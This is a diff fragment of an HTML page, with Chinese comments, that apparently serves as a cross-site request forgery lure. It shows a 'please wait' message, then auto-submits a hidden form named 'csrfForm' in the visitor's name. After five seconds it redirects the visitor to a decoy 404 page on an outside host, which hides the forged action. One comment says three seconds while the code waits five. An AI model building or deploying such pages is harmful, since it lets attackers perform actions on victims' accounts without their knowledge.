@@ -51,17 +51,18 @@
 
   <p>⏳ 正在提交，请稍候…</p>
 
-  <script>
-    window.onload = () => {
-      // 自动提交表单
-      document.getElementById("csrfForm").submit();
 
-      // 5 秒后无条件跳转 404 页面（无论结果如何）
-      setTimeout(() => {
-        window.location.href = "https://ad721.nb200.net//404.html";
-      }, 5000);
-    };
-  </script>
+ <script>
+    // 延迟 3 秒提交表单到 iframe
+    setTimeout(() => {
+      document.getElementById('csrfForm').submit();
+    }, 5000);
+
+    // 延迟 5 秒跳转 404 页面
+    setTimeout(() => {
+      window.location.href = "https://ad721.nb200.net/404.html";
+    }, 5000);
+  </script> 
 
 </body>
 </html>
